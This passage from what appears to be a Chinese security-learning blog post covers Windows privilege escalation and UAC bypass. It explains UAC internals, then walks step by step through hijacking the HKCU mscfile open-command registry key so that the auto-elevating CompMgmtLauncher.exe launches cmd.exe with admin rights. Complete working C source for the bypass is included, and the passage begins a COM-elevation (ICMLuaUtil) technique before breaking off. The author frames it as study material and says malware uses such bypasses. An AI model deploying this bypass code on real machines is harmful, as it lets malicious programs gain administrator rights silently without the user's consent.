&lt;span style="color:#669900"&gt;int&lt;/span&gt; iPid &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;int&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;\_getpid&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
std&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;cout &lt;span style="color:#669900"&gt;&lt;&lt;&lt;/span&gt; &lt;span style="color:#669900"&gt;"The process id is: "&lt;/span&gt; &lt;span style="color:#669900"&gt;&lt;&lt;&lt;/span&gt; iPid &lt;span style="color:#669900"&gt;&lt;&lt;&lt;/span&gt; std&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;endl&lt;span style="color:#999999"&gt;;&lt;/span&gt;

    &lt;span style="color:#669900"&gt;//&lt;/span&gt;修改当前进程令牌访问权限
    &lt;span style="color:#c678dd"&gt;if&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;FALSE &lt;span style="color:#669900"&gt;==&lt;/span&gt; EnbalePrivileges&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;GetCurrentProcess&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; SE_DEBUG_NAME&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;
    &lt;span style="color:#999999"&gt;{&lt;/span&gt;
    	printf&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;"Enable Privileges Error!\n"&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#999999"&gt;}&lt;/span&gt;
    printf&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;"Enable Privileges OK!\n"&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;

    system&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;"PAUSE"&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#c678dd"&gt;return&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;

&lt;span style="color:#999999"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/span&gt;</code></pre>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
运行结果如下图所示，
<strong>
注意需要以管理员权限运行
</strong>
，否则会提示相关错误。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<img alt="在这里插入图片描述" height="320" src="https://i-blog.csdnimg.cn/blog_migrate/2314ea260779fbafb34531d81599855d.png#pic_center" width="550"/>
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<strong>
问题：怎么判断我是否提权成功呢？
</strong>
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
同时，编程过程中会遇到各种错误，请大家一定实际去编写代码，学会谷歌百度独立解决。 比如"const char _"类型的实参与“LPCWSTR”类型的形参不兼容，基本的解决方法如下：
</span>
</p>
<ul style="margin-left:0px;">
<li>
配置属性 -&gt; 常规 -&gt; 字符集 -&gt; 使用多字节字符集
</li>
<li>
C/C++ -&gt; SDL 检查-&gt; 否
</li>
<li>
C/C++ -&gt; 语言 -&gt; 符合模式 -&gt; 否
</li>
</ul>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<img alt="在这里插入图片描述" height="350" src="https://i-blog.csdnimg.cn/blog_migrate/75ee3eccda319cb58212a93bce192a56.png#pic_center" width="550"/>
</span>
</p>
<p>
</p>
<hr/>
<h2 style="margin-left:0px;">
<strong>
<span style="color:#4f4f4f;">
<a name="t5">
</a>
<a id="Bypass_UAC_387">
</a>
二.Bypass UAC
</span>
</strong>
</h2>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
UAC（User Account Control）是微软在 Windows VISTA 以后版本中引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员账户的安全上下文中运行，除非特别授予管理员级别的系统访问权限。UAC 可以阻止未授权的应用程序自动进行安装，并防止无意地更改系统。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<img alt="在这里插入图片描述" height="250" src="https://i-blog.csdnimg.cn/blog_migrate/99fdb22bd3fd4df6ae01386e300a39f7.png#pic_center" width="450"/>
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
UAC 需要授权的动作包括：配置 Windows Update、增加或删除用户账户、改变用户账户的类型、改变 UAC 设置、安装 ActiveX、安装或移除程序、安装设备驱动程序、设置家长控制、将文件移动或复制到 Program Files 或 Windows 目录、查看其他用户文件夹等。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
触发 UAC 时，系统会创建一个 consent.exe 进程，该进程通过白名单程序和用户选择来判断是否创建管理员权限进程。请求进程将要请求的进程 cmdline 和进程路径通过 LPC 接口传递给 appinfo 的 RAiLuanchAdminProcess 函数。流程如下：
</span>
</p>
<ul style="margin-left:0px;">
<li>
该函数首选验证路径是否在白名单中
</li>
<li>
接着将结果传递给 consent.exe 进程
</li>
<li>
该进程验证请求进程的签名以及发起者的权限是否符合要求后，决定是否弹出 UAC 窗口让用户确认
</li>
<li>
UAC 窗口会创建新的安全桌面，屏蔽之前的界面，同时 UAC 窗口进程是系统权限进程，其他普通进程无法和其进行通信交互，用户确认后，调用 CreateProcessAsUser 函数以管理员身份启动请求的进程
</li>
</ul>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
病毒木马如果想要实现更多的权限操作，那么就不得不绕过 UAC 弹窗，在没有通知用户的情况下，静默地将程序的普通权限提升为管理员权限，从而使程序可以实现一些需要权限的操作。目前实现 Bypass UAC 主要有两种方法：
</span>
</p>
<ul style="margin-left:0px;">
<li>
<strong>
一种是利用白名单提权机制
</strong>
</li>
<li>
<strong>
一种是利用 COM 组件接口技术
</strong>
</li>
</ul>
<p>
</p>
<hr/>
<h3 style="margin-left:0px;">
<strong>
<span style="color:#4f4f4f;">
<a name="t6">
</a>
<a id="1Bypass_UAC_409">
</a> 1.基于白名单程序的 Bypass UAC
</span>
</strong>
</h3>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
有些系统程序可以直接获取管理员权限，而不触发 UAC 弹框，这类程序成为白名单程序。例如：slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe 等等。这些白名单程序可以通过 DLL 劫持、注入或是修改注册表执行命令的方式启动目标程序，实现 Bypass UAC 提权操作。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
下面选择白名单程序 CompMgmtLauncher.exe 进行详细分析，利用它实现 Bypass UAC 提权。分析的环境是 64 位 Windows 10 操作系统，使用的工具是进程监控器 Procmon.exe。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<strong>
第一步，在 System32 目录下运行 CompMgmtLauncher.exe 程序。
</strong>
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<img alt="在这里插入图片描述" height="350" src="https://i-blog.csdnimg.cn/blog_migrate/a2d6fe15ca8c82d0d922b0be4c3d3f69.png#pic_center" width="550"/>
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
此时并没有出现 UAC 弹窗就直接显示计算机管理的窗口界面。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<img alt="在这里插入图片描述" height="350" src="https://i-blog.csdnimg.cn/blog_migrate/a01e717df22306ce9077589e370493ab.png#pic_center" width="550"/>
</span>
</p>
<p>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<strong>
第二步，使用 procmon 软件监控该进程的所有操作。
</strong>
<br/>
主要是监控注册表和文件的操作，设置进程名为 CompMgmtLauncher.exe 过滤即可。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<img alt="在这里插入图片描述" height="350" src="https://i-blog.csdnimg.cn/blog_migrate/d274c3258f240946d8fba597326c39cf.png#pic_center" width="550"/>
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
输出结果如下图所示：
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<img alt="在这里插入图片描述" height="350" src="https://i-blog.csdnimg.cn/blog_migrate/93932afd63a20bc50ca7fcf67230ed6f.png#pic_center" width="600"/>
</span>
<br/>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<strong>
第三步，分析该进程注册表操作。
</strong>
<br/>
Procmon 监控数据分析发现，计算机管理进程会先查询注册表中数据。
</span>
</p>
<ul style="margin-left:0px;">
<li>
HKCU\Software\Classes\mscfile\shell\open\command
</li>
</ul>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
发现该路径不存在后，继续查询注册表中的数据并读取。
</span>
</p>
<ul style="margin-left:0px;">
<li>
HKCR\mscfile\shell\open\command(Default)
</li>
</ul>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
该注册表路径中存储着 mmc.exe 进程的路径信息，如下图所示。然后，计算机管理程序会根据读取到的路径启动程序，显示计算机管理的窗口界面。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<span style="color:#FF0000;">
疑惑：如何通过该软件定位进程的执行逻辑或操作流程？感觉不是 Procmon 就能实现的。
</span>
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<img alt="在这里插入图片描述" height="350" src="https://i-blog.csdnimg.cn/blog_migrate/b61326e448c2627b61205693059359b6.png#pic_center" width="600"/>
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
注册表中内容对应如下：
</span>
</p>
<ul style="margin-left:0px;">
<li>
%SystemRoot%\system32\mmc.exe “%1” %_
</li>
</ul>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<img alt="在这里插入图片描述" height="350" src="https://i-blog.csdnimg.cn/blog_migrate/f8ed4fa49770ddd57f143425276e8828.png#pic_center" width="550"/>
</span>
</p>
<p>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<strong>
第四步，手动构造注册表路径弹窗 cmd 命令行程序。
</strong>
<br/>
在 CompMgmtLauncher.exe 启动的过程中，有一个关键的操作就是它会先读取注册表的数据。
</span>
</p>
<ul style="margin-left:0px;">
<li>
HKCU\Software\Classes\mscfile\shell\open\command
</li>
</ul>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
我们开系统注册表编辑器 regedit.exe，查看相应路径下的注册表，发现该注册表路径确实不存在。所以，如果自己构造该注册路径，写入启动程序的路径，这样，CompMgmtLauncher.exe 便会启动该程序。为了验证这个猜想，自己手动添加该注册表路径，并设置默认的数据为 C:\Windows\System32\cmd.exe。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<img alt="在这里插入图片描述" height="250" src="https://i-blog.csdnimg.cn/blog_migrate/b97d979477609a12f4ce6aa0e4a986b5.png#pic_center" width="550"/>
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
注册表修改如下：
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<img alt="在这里插入图片描述" height="320" src="https://i-blog.csdnimg.cn/blog_migrate/f3800cb399fa09265dbb3c662a3fc659.png#pic_center" width="550"/>
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
然后使用 Procmon.exe 进行监控并运行 CompMgmtLauncher.exe，成功弹出 cmd.exe 命令行窗口，而且提示管理员权限，如下图所示，注意左上角显示的是“计算机管理”而不再是“CMD”。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<img alt="在这里插入图片描述" height="320" src="https://i-blog.csdnimg.cn/blog_migrate/c356f31a949732c4bf07c8d165b8eeaf.png#pic_center" width="550"/>
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
查看 Procmon.exe 的监控数据，CompMgmtLauncher.exe 确实直接读取注册表路径中的数据并启动。
</span>
</p>
<p>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<strong>
第五步，编写代码实现相关功能。
</strong>
<br/>
利用 CompMgmtLauncher.exe 白名单程序 Bypass UAC 提权的原理讲到这里，接下来编写程序创建并添加注册表，并写入自定义的程序路径。
</span>
</p>
<ul style="margin-left:0px;">
<li>
HKCU\Software\Classes\mscfile\shell\open\command(Default)
</li>
</ul>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
具体 Bypass UAC 代码如下，运行计算机管理程序即可完成 Bypass UAC 提权操作。其中，HKEY_CURRENT_USER 是用户注册表，程序使用普通权限即可进行修改。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<strong>
Tiquan02 完整代码
</strong>
</span>
</p>
<pre class="has" style="margin-left:0px;"><code class="language-prettyprint">&lt;span style="color:#000000"&gt;&lt;code class="language-c"&gt;&lt;span style="color:#98c379"&gt;#&lt;span style="color:#c678dd"&gt;include&lt;/span&gt;&lt;span style="color:#669900"&gt;&lt;windows.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span style="color:#98c379"&gt;#&lt;span style="color:#c678dd"&gt;include&lt;/span&gt;&lt;span style="color:#669900"&gt;&lt;string.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span style="color:#98c379"&gt;#&lt;span style="color:#c678dd"&gt;include&lt;/span&gt;&lt;span style="color:#669900"&gt;&lt;iostream&gt;&lt;/span&gt;&lt;/span&gt;
using namespace std&lt;span style="color:#999999"&gt;;&lt;/span&gt;

&lt;span style="color:#5c6370"&gt;//显示错误信息&lt;/span&gt;
&lt;span style="color:#c678dd"&gt;void&lt;/span&gt; &lt;span style="color:#61aeee"&gt;ShowError&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#c678dd"&gt;char&lt;/span&gt;&lt;span style="color:#669900"&gt;\*&lt;/span&gt; pszText&lt;span style="color:#999999"&gt;)&lt;/span&gt;
&lt;span style="color:#999999"&gt;{&lt;/span&gt;
&lt;span style="color:#c678dd"&gt;char&lt;/span&gt; szErr&lt;span style="color:#999999"&gt;[&lt;/span&gt;MAX_PATH&lt;span style="color:#999999"&gt;]&lt;/span&gt; &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#999999"&gt;{&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt; &lt;span style="color:#999999"&gt;}&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#61aeee"&gt;wsprintf&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;szErr&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#669900"&gt;"%s Error[%d]\n"&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; pszText&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#61aeee"&gt;GetLastError&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#98c379"&gt;#&lt;span style="color:#c678dd"&gt;ifdef&lt;/span&gt; \_DEBUG&lt;/span&gt;
&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#61aeee"&gt;MessageBox&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#98c379"&gt;NULL&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; szErr&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#669900"&gt;"ERROR"&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; MB_OK &lt;span style="color:#669900"&gt;|&lt;/span&gt; MB_ICONERROR&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#98c379"&gt;#&lt;span style="color:#c678dd"&gt;endif&lt;/span&gt;&lt;/span&gt;
&lt;span style="color:#999999"&gt;}&lt;/span&gt;

&lt;span style="color:#5c6370"&gt;//修改注册表&lt;/span&gt;
BOOL &lt;span style="color:#61aeee"&gt;SetReg&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#c678dd"&gt;char&lt;/span&gt;&lt;span style="color:#669900"&gt;\*&lt;/span&gt; lpszExePath&lt;span style="color:#999999"&gt;)&lt;/span&gt;
&lt;span style="color:#999999"&gt;{&lt;/span&gt;
HKEY hKey &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#98c379"&gt;NULL&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#5c6370"&gt;//创建项&lt;/span&gt;
&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#61aeee"&gt;RegCreateKeyEx&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;HKEY_CURRENT_USER&lt;span style="color:#999999"&gt;,&lt;/span&gt;
&lt;span style="color:#669900"&gt;"Software\\Classes\\mscfile\\Shell\\Open\\Command"&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt;
&lt;span style="color:#98c379"&gt;0&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#98c379"&gt;NULL&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; KEY_WOW64_64KEY &lt;span style="color:#669900"&gt;|&lt;/span&gt; KEY_ALL_ACCESS&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#98c379"&gt;NULL&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#669900"&gt;&amp;&lt;/span&gt;hKey&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#98c379"&gt;NULL&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;

    &lt;span style="color:#c678dd"&gt;if&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#98c379"&gt;NULL&lt;/span&gt; &lt;span style="color:#669900"&gt;==&lt;/span&gt; hKey&lt;span style="color:#999999"&gt;)&lt;/span&gt; &lt;span style="color:#999999"&gt;{&lt;/span&gt;
    	&lt;span style="color:#61aeee"&gt;ShowError&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;"RegCreateKeyEx"&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    	&lt;span style="color:#c678dd"&gt;return&lt;/span&gt; FALSE&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#999999"&gt;}&lt;/span&gt;
    &lt;span style="color:#5c6370"&gt;//设置键值&lt;/span&gt;
    &lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#61aeee"&gt;RegSetValueEx&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;hKey&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#98c379"&gt;NULL&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; REG_SZ&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;BYTE&lt;span style="color:#669900"&gt;*&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;lpszExePath&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#98c379"&gt;1&lt;/span&gt; &lt;span style="color:#669900"&gt;+&lt;/span&gt; &lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#61aeee"&gt;lstrlen&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;lpszExePath&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#5c6370"&gt;//关闭注册表&lt;/span&gt;
    &lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#61aeee"&gt;RegCloseKey&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;hKey&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#c678dd"&gt;return&lt;/span&gt; TRUE&lt;span style="color:#999999"&gt;;&lt;/span&gt;

&lt;span style="color:#999999"&gt;}&lt;/span&gt;

&lt;span style="color:#5c6370"&gt;//主函数&lt;/span&gt;
&lt;span style="color:#c678dd"&gt;int&lt;/span&gt; &lt;span style="color:#61aeee"&gt;main&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#c678dd"&gt;int&lt;/span&gt; argc&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#c678dd"&gt;char&lt;/span&gt;&lt;span style="color:#669900"&gt;\*&lt;/span&gt; argv&lt;span style="color:#999999"&gt;[&lt;/span&gt;&lt;span style="color:#999999"&gt;]&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;
&lt;span style="color:#999999"&gt;{&lt;/span&gt;
BOOL bRet &lt;span style="color:#669900"&gt;=&lt;/span&gt; FALSE&lt;span style="color:#999999"&gt;;&lt;/span&gt;
PVOID OldValue &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#98c379"&gt;NULL&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;

    &lt;span style="color:#5c6370"&gt;// 关闭文件重定位&lt;/span&gt;
    &lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#61aeee"&gt;Wow64DisableWow64FsRedirection&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;&amp;&lt;/span&gt;OldValue&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;

    &lt;span style="color:#5c6370"&gt;// 修改注册表&lt;/span&gt;
    bRet &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#61aeee"&gt;SetReg&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;"C:\\Windows\\System32\\cmd.exe"&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#c678dd"&gt;if&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;bRet&lt;span style="color:#999999"&gt;)&lt;/span&gt; &lt;span style="color:#999999"&gt;{&lt;/span&gt;
    	&lt;span style="color:#5c6370"&gt;// 运行 CompMgmtLauncher.exe&lt;/span&gt;
    	&lt;span style="color:#61aeee"&gt;system&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;"CompMgmtLauncher.exe"&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    	&lt;span style="color:#61aeee"&gt;printf&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;"Run OK!\n"&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#999999"&gt;}&lt;/span&gt;
    &lt;span style="color:#c678dd"&gt;else&lt;/span&gt; &lt;span style="color:#999999"&gt;{&lt;/span&gt;
    	&lt;span style="color:#61aeee"&gt;printf&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;"Run ERROR!\n"&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#999999"&gt;}&lt;/span&gt;

    &lt;span style="color:#5c6370"&gt;// 恢复文件重定位&lt;/span&gt;
    &lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#61aeee"&gt;Wow64RevertWow64FsRedirection&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;OldValue&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#61aeee"&gt;system&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;"pause"&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#c678dd"&gt;return&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;

&lt;span style="color:#999999"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/span&gt;</code></pre>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
输出结果如下图所示，360 成功识别在劫持程序，点击允许后及弹出对应的计算机管理 CMD。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<img alt="在这里插入图片描述" height="350" src="https://i-blog.csdnimg.cn/blog_migrate/5af3f4a7025a355dd5bf2f8b1de2aa59.png#pic_center" width="550"/>
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
该程序成功利用白名单程序实现了 Bypass UAC 提权操作，并向注册表中写入 cmd 程序并启动，其实这也算一种利用白名单的程序劫持，最终效果如下图所示。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<img alt="在这里插入图片描述" height="350" src="https://i-blog.csdnimg.cn/blog_migrate/79a43c723baee2d0d7bb08dd4fdec8a4.png#pic_center" width="550"/>
</span>
</p>
<p>
</p>
<hr/>
<h3 style="margin-left:0px;">
<strong>
<span style="color:#4f4f4f;">
<a name="t7">
</a>
<a id="2COMBypass_UAC_560">
</a> 2.基于 COM 组件接口的 Bypass UAC
</span>
</strong>
</h3>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
COM 提升名称（COM Elevation Moniker）技术允许运行在用户帐户控制（UAC）下的应用程序，以提升权限的方法来激活 COM 类，最终提升 COM 接口权限。其中，ICMLuaUtil 接口提供了 ShellExec 方法来执行命令，创建指定进程。所以，接下来介绍的基于 ICMLuaUtil 接口的 Bypass UAC 的实现原理，它是利用 COM 提升名称来对 ICMLuaUtil 接口提权，提权后通过调用 ShellExec 方法来创建指定进程，实现 Bypass UAC 操作。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
使用权限提升 COM 类的程序必须调通过用 CoCreateInstanceAsAdmin 函数来创建 COM 类，COM 提升名称具体的实现代码如下：
</span>
</p>
<pre class="has" style="margin-left:0px;"><code class="language-prettyprint">&lt;span style="color:#000000"&gt;&lt;code class="language-c"&gt;HRESULT &lt;span style="color:#61aeee"&gt;CoCreateInstanceAsAdmin&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;HWND hWnd&lt;span style="color:#999999"&gt;,&lt;/span&gt; REFCLSID rclsid&lt;span style="color:#999999"&gt;,&lt;/span&gt; REFIID riid&lt;span style="color:#999999"&gt;,&lt;/span&gt; PVOID &lt;span style="color:#669900"&gt;_&lt;/span&gt;ppVoid&lt;span style="color:#999999"&gt;)&lt;/span&gt;
&lt;span style="color:#999999"&gt;{&lt;/span&gt;
BIND_OPTS3 bo&lt;span style="color:#999999"&gt;;&lt;/span&gt;
